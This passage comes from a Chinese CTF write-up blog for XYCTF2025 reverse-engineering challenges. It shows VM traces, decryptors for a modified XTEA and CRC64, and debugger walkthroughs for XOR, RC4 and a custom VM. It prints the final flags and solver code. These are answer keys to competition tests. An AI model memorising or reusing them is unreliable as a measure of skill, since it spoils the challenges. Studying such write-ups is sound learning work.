class="number">3</span>ec6f7b3 ^ fae3f5f5 = c4250246</span><br><span class="line">W2 = W1 + W0 --- c4250246 + <span class="number">703</span>addbe = <span class="number">1345</span>fe004</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">345</span>fe004 &gt;&gt; <span class="number">4</span> = <span class="number">345</span>fe00</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">345</span>fe004 &lt;&lt; <span class="number">7</span> = <span class="number">1</span>a2ff00200</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">345</span>fe00 ^ <span class="number">2</span>ff00200 = <span class="number">2</span>cb5fc00</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">345</span>fe004 ^ <span class="number">55667788</span> = <span class="number">6139978</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">2</span>cb5fc00 + <span class="number">6139978</span>c = <span class="number">8</span>def938c</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">3</span>c3f696a &gt;&gt; b = <span class="number">787</span>ed</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">787</span>ed &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">3</span>c3f696a = a1aacad7</span><br><span class="line">W2 = W0 ^ W3 --- a1aacad7 ^ <span class="number">23235566</span> = <span class="number">82899</span>fb1</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">82899</span>fb1 ^ <span class="number">8</span>def938c = f660c3d</span><br><span class="line">W2 = W1 + W0 --- f660c3d + <span class="number">8952</span>dc1 = <span class="number">17</span>fb39fe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">17</span>fb39fe &gt;&gt; <span class="number">5</span> = bfd9cf</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">17</span>fb39fe &lt;&lt; <span class="number">6</span> = <span class="number">5</span>fece7f80</span><br><span class="line">W3 = W1 ^ W0 --- bfd9cf ^ fece7f80 = fe71a64f</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">17</span>fb39fe ^ <span class="number">11223344</span> = <span class="number">6</span>d90aba</span><br><span class="line">W2 = W1 + W0 --- fe71a64f + <span class="number">6</span>d90aba = <span class="number">1054</span>ab109</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f696a &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">3</span>c3f696a = <span class="number">9</span>dacc8dc</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9</span>dacc8dc ^ abab1212 = <span class="number">3607</span>dace</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">54</span>ab109 ^ <span class="number">3607</span>dace = <span class="number">334</span>d6bc7</span><br><span class="line">W2 = W1 + W0 --- <span class="number">334</span>d6bc7 + <span class="number">345</span>fe004 = <span class="number">67</span>ad4bcb</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">67</span>ad4bcb &gt;&gt; <span class="number">4</span> = <span class="number">67</span>ad4bc</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">67</span>ad4bcb &lt;&lt; <span class="number">7</span> = <span class="number">33</span>d6a<span class="number">5e580</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">67</span>ad4bc ^ d6a<span class="number">5e580</span> = d0df313c</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">67</span>ad4bcb ^ <span class="number">55667788</span> = <span class="number">32</span>cb3c43</span><br><span class="line">W2 = W1 + W0 --- d0df313c + <span class="number">32</span>cb3c43 = <span class="number">103</span>aa6d7f</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9</span>b9f5051 &gt;&gt; b = <span class="number">1373</span>ea</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1373</span>ea &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">9</span>b9f5051 = fd0cafc3</span><br><span class="line">W2 = W0 ^ W3 --- fd0cafc3 ^ <span class="number">23235566</span> = de2ffaa5</span><br><span class="line">W3 = W1 ^ W0 --- de2ffaa5 ^ <span class="number">3</span>aa6d7f = dd8597da</span><br><span class="line">W2 = W1 + W0 --- dd8597da + <span class="number">17</span>fb39fe = f580d1d8</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f580d1d8 &gt;&gt; <span class="number">5</span> = <span class="number">7</span>ac068e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f580d1d8 &lt;&lt; <span class="number">6</span> = <span class="number">3</span>d60347600</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>ac068e ^ <span class="number">60347600</span> = <span class="number">6798708</span>e</span><br><span class="line">W2 = W0 ^ W3 --- f580d1d8 ^ <span class="number">11223344</span> = e4a<span class="number">2e29</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6798708</span>e + e4a<span class="number">2e29</span>c = <span class="number">14</span>c3b532a</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">9</span>b9f5051 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">9</span>b9f5051 = <span class="number">1010</span>ab1be</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">10</span>ab1be ^ abab1212 = aaa1a3ac</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4</span>c3b532a ^ aaa1a3ac = e69af086</span><br><span class="line">W2 = W1 + W0 --- e69af086 + <span class="number">67</span>ad4bcb = <span class="number">14e483</span>c51</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">4e483</span>c51 &gt;&gt; <span class="number">4</span> = <span class="number">4e483</span>c5</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4e483</span>c51 &lt;&lt; <span class="number">7</span> = <span class="number">27241e2880</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4e483</span>c5 ^ <span class="number">241e2880</span> = <span class="number">20</span>faab45</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">4e483</span>c51 ^ <span class="number">55667788</span> = <span class="number">1</span>b<span class="number">2e4</span>bd9</span><br><span class="line">W2 = W1 + W0 --- <span class="number">20</span>faab45 + <span class="number">1</span>b<span class="number">2e4</span>bd9 = <span class="number">3</span>c28f71e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- faff3738 &gt;&gt; b = <span class="number">1</span>f5fe6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>f5fe6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + faff3738 = <span class="number">15</span>c6c96aa</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5</span>c6c96aa ^ <span class="number">23235566</span> = <span class="number">7</span>f4fc3cc</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>f4fc3cc ^ <span class="number">3</span>c28f71e = <span class="number">436734</span>d2</span><br><span class="line">W2 = W1 + W0 --- <span class="number">436734</span>d2 + f580d1d8 = <span class="number">138e806</span>aa</span><br></pre></td></tr></table></figure><p>通过观察可以发现是一个魔改的XTea加密。</p><p>通过对比标准XTea加密流程，可以得到里面参与计算的4个key值 <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> 以及delta值 <strong>0x5f5fe6e7</strong></p><p>写出对应加密的c++代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 += tmp2;</span><br><span class="line">        sum += delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 += tmp4;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提取chal程序中的密文，进行解密即可。</p><p>完整解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key[]&#123;</span><br><span class="line">        <span class="number">0x776f6853</span>,</span><br><span class="line">        <span class="number">0x656b616d</span>,</span><br><span class="line">        <span class="number">0x616d5f72</span>,</span><br><span class="line">        <span class="number">0x74696564</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Encflag[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x696C2E9A</span>, <span class="number">0x76ADE8E1</span>, <span class="number">0xE67D5CA4</span>, <span class="number">0x5C76BD38</span>,</span><br><span class="line">        <span class="number">0xB7AC0787</span>, <span class="number">0xBFEA0C65</span>, <span class="number">0x01C2FF10</span>, <span class="number">0x6D16FD38</span>&#125;;</span><br><span class="line">    <span class="built_in">decipher</span>(Encflag, key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">8</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">16</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">24</span>), key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Encflag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p><h2 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h2><p>跟到moon.xor_crypt实际加密处。</p><p><img src="/2025/04/07/XYCTF2025/6.png"></p><p>发现是进行了单次xor，并加入到一个list中，前后过程不清楚。</p><p>断在xor这个命令，运行附加调试，随便输入一串1</p><p><img src="/2025/04/07/XYCTF2025/7.png"></p><p><img src="/2025/04/07/XYCTF2025/8.png"></p><p>发现是输入的’1’和一个0x24进行xor，多运行几次发现就是将输入的字符串都异或上一些值。</p><p>直接断在return处，v20是最后将list转成Bytes的结果。</p><p><img src="/2025/04/07/XYCTF2025/9.png"></p><p>发现是28长度的一串字节，从0x15开始的，就是我们输入字符串长度以及异或完的结果。</p><p><img src="/2025/04/07/XYCTF2025/10.png"></p><p>继续运行会返回到check_flag代码处，底下有一个RichCompare比较两个数据。</p><p><img src="/2025/04/07/XYCTF2025/11.png"></p><p>v45可以看到就是将刚刚v20的bytes直接unhex转成了一串字符串。</p><p><img src="/2025/04/07/XYCTF2025/12.png"></p><p>那么v9就应该是flag的密文，可以数出一共是要35字节。</p><p><img src="/2025/04/07/XYCTF2025/13.png"></p><p>重新调试运行输入35个1，在check_flag开头断点，把输入的字符串全都patch成0。</p><p><img src="/2025/04/07/XYCTF2025/14.png"></p><p><img src="/2025/04/07/XYCTF2025/15.png"></p><p><img src="/2025/04/07/XYCTF2025/16.png"></p><p>最后在RichCompare处就可以得到xor密文的列表。</p><p><img src="/2025/04/07/XYCTF2025/17.png"></p><p>将v9的密文与这个数据进行xor即可得到flag。</p><p><img src="/2025/04/07/XYCTF2025/18.png"></p><p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p><h2 id="Dragon（5m10v3师傅解题）"><a href="#Dragon（5m10v3师傅解题）" class="headerlink" title="Dragon（5m10v3师傅解题）"></a>Dragon（5m10v3师傅解题）</h2><p>.bc 后缀 </p><p>反编译为LLVM IR</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis-<span class="number">17</span> Dragon.bc -o Dragon.ll</span><br></pre></td></tr></table></figure><p>分析得知为crc64，以两个为一组进行校验，直接爆破就行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">calculate_crc64_direct</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">uint64_t</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> crc = <span class="number">0xFFFFFFFFFFFFFFFFULL</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint64_t</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        crc ^= ((<span class="type">uint64_t</span>)data[i] &lt;&lt; <span class="number">56</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint64_t</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (crc &amp; <span class="number">0x8000000000000000ULL</span>) &#123; </span><br><span class="line">                crc = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x42F0E1EBA9EA3693ULL</span>; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                crc = crc &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ~crc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> enc[<span class="number">12</span>] = &#123;</span><br><span class="line">       <span class="number">-2565957437423125689</span>, </span><br><span class="line">        <span class="number">224890624719110086</span>, </span><br><span class="line">        <span class="number">1357324823849588894</span>, </span><br><span class="line">        - <span class="number">8941695979231947288</span>, </span><br><span class="line">        - <span class="number">253413330424273460</span>, </span><br><span class="line">        - <span class="number">7817463785137710741</span>, </span><br><span class="line">        - <span class="number">5620500441869335673</span>, </span><br><span class="line">        <span class="number">984060876288820705</span>, </span><br><span class="line">        - <span class="number">6993555743080142153</span>, </span><br><span class="line">        - <span class="number">7892488171899690683</span>, </span><br><span class="line">        <span class="number">7190415315123037707</span>, </span><br><span class="line">        - <span class="number">7218240302740981077</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">25</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> flag_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">12</span>; k++) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> target_crc = enc[k];</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c1 = <span class="number">32</span>; c1 &lt; <span class="number">127</span> &amp;&amp; !found; c1++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c2 = <span class="number">32</span>; c2 &lt; <span class="number">127</span> &amp;&amp; !found; c2++) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> test[<span class="number">2</span>] = &#123; c1, c2 &#125;;</span><br><span class="line">                <span class="type">uint64_t</span> crc = <span class="built_in">calculate_crc64_direct</span>(test, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (crc == target_crc) &#123;</span><br><span class="line">                    flag[flag_index++] = c1;</span><br><span class="line">                    flag[flag_index++] = c2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flag[flag_index] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted flag: %s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Summer（5m10v3师傅解题）"><a href="#Summer（5m10v3师傅解题）" class="headerlink" title="Summer（5m10v3师傅解题）"></a>Summer（5m10v3师傅解题）</h2><p>haskell程序</p><p>函数式编程语言,这意味着一切都是惰性计算，什么是惰性计算？ 简单来说就是在调用之前不会对该值进行计算</p><p>浏览 main 函数，可以看到 hs_main 将 ZCMain_main_closure 作为它的参数，它指向 haskell 程序的真正入口点</p><p><img src="/2025/04/07/XYCTF2025/31.png"></p><p>ZCMain_main_closure里面我们发现它调用了stg_ap_p_fast，这个是底层函数，主要调用Main_main_closure这个函数</p><p><img src="/2025/04/07/XYCTF2025/19.png"></p><p>GHCziInternalziBase也是底层函数，主要关注两个参数</p><p><img src="/2025/04/07/XYCTF2025/20.png"></p><p>第一个参数的地址处的函数为打印字符串</p><p><img src="/2025/04/07/XYCTF2025/21.png"></p><p><img src="/2025/04/07/XYCTF2025/22.png"></p><p>GHCziInternalziList_length 为处理我们的传入的字符串的长度，直接调用的是zdwlenAcc**，**zdwlenAcc 将通过检查下一个是否是列表的末尾来计算 “flagTable” 的长度（这里的”flagTable” 是我自己命名,其实就是存储惰性列表，我们可以根据惰性列表的指针数判断字符串的长度）</p><p><img src="/2025/04/07/XYCTF2025/23.png"></p><p><img src="/2025/04/07/XYCTF2025/24.png"></p><p>我们这里就用flag进行测试，一方面是为了查看他的返回值</p><p><img src="/2025/04/07/XYCTF2025/25.png"></p><p>此时他是将rbx此处(即为惰性列表的末尾)，可以人工数(即为50)</p><p><img src="/2025/04/07/XYCTF2025/26.png"></p><p>另外一种为看返回值，第一次断下是返回我们输入字符串的长度，第二次断下是返回密钥的长度，第三次断下是返回密文的长度</p><p><img src="/2025/04/07/XYCTF2025/27.png"></p><p><img src="/2025/04/07/XYCTF2025/28.png"></p><p><img src="/2025/04/07/XYCTF2025/29.png"></p><p>另外一处为GHCziInternalziNum_zdfNumIntzuzdczp，这个也是在网上一篇文章看到的,在<strong>add     rbx, [rax]</strong> 在经过几次迭代后，我可以看到一些字符开始出现，此时我们可以得到密钥为<strong>Klingsor’s_Last_Summer</strong></p><p><img src="/2025/04/07/XYCTF2025/30.png"></p><p>我们在.data段得到了密钥，因此我们可以猜测下面可能为密文,并且下面都是指针+元素的存储形式</p><p><img src="/2025/04/07/XYCTF2025/32.png"></p><p><img src="/2025/04/07/XYCTF2025/33.png"></p><p>然后通过CE调试得到明文和密文，然后得出为rc4+xor</p><p><img src="/2025/04/07/XYCTF2025/34.png"></p><p><img src="/2025/04/07/XYCTF2025/35.png"></p><p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p><h2 id="Lake"><a href="#Lake" class="headerlink" title="Lake"></a>Lake</h2><p>单步跟到主函数。</p><p><img src="/2025/04/07/XYCTF2025/36.png"></p><p>这边输入字符串后先赋值到了另一个数组，然后进行了一次简易VM计算进行了第一次加密，</p><p><img src="/2025/04/07/XYCTF2025/37.png"></p><p>然后接着第二次加密，最后循环比较。</p><p><img src="/2025/04/07/XYCTF2025/38.png"></p><p><img src="/2025/04/07/XYCTF2025/39.png"></p><p>发现VM只用到了加减和XOR计算，在这三个地方的关键点打断点，输出寄存器和计算流程，这边为了方便直接复制到代码里面解密，将加减断点里面的输出运算符反过来，输出出来的代码直接复制到代码就是进行解密的流程。</p><p><img src="/2025/04/07/XYCTF2025/40.png"></p><p><img src="/2025/04/07/XYCTF2025/41.png"></p><p><img src="/2025/04/07/XYCTF2025/42.png"></p><p>调试输出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span 